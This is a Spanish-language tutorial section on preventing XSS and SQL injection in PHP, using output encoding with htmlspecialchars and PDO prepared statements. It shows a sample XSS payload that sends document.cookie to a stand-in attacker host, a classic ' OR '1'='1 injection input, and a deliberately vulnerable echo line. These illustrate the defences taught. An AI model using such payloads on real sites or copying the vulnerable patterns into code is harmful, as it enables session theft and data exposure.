# 5.2 Prevención de Ataques Web Comunes

## 1. Cross-Site Scripting (XSS)

**El Ataque:** El atacante inyecta código JavaScript malicioso en una página vista por otros usuarios.
*   *Vector:* Un campo de comentarios, un perfil de usuario.
*   *Payload:* `<script>fetch('http://atacante.com/robar?cookie=' + document.cookie)</script>`
*   *Impacto:* Robo de sesión (Account Takeover), redirecciones maliciosas.

**La Defensa: Output Encoding**
La regla es: **"Codificar al salir"**. Antes de imprimir cualquier dato proporcionado por un usuario en el HTML, convierta los caracteres especiales en entidades HTML inofensivas.

```php
// MAL: Vulnerable a XSS
echo "Hola, " . $_GET['nombre'];

// BIEN: Seguro
// <script> se convierte en &lt;script&gt;
echo "Hola, " . htmlspecialchars($_GET['nombre'], ENT_QUOTES, 'UTF-8');
```

## 2. SQL Injection (SQLi)

**El Ataque:** El atacante manipula la entrada para alterar la estructura de la consulta SQL.
*   *Código Vulnerable:* `SELECT * FROM users WHERE name = '$nombre'`
*   *Input:* `' OR '1'='1`
*   *Resultado:* `SELECT * FROM users WHERE name = '' OR '1'='1'` (Siempre verdadero, devuelve todos los usuarios).

**La Defensa: Sentencias Preparadas (Prepared Statements)**
Esta es la **única** defensa robusta. Separa la estructura SQL de los datos. La base de datos compila la consulta primero, y luego inserta los datos como parámetros literales, nunca como código ejecutable.

```php
// Conexión PDO
$pdo = new PDO('mysql:host=localhost;dbname=test', 'root', '');

// 1. Preparar (La estructura se envía a la BD)
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');

// 2. Ejecutar (Se envían los datos)
$stmt->execute(['email' => $input_usuario]);
$user = $stmt->fetch();
```

**Nota de Ingeniería:** Nunca use funciones de "escape" manuales (como `mysql_real_escape_string`) si puede usar Sentencias Preparadas. Son propensas a errores humanos.
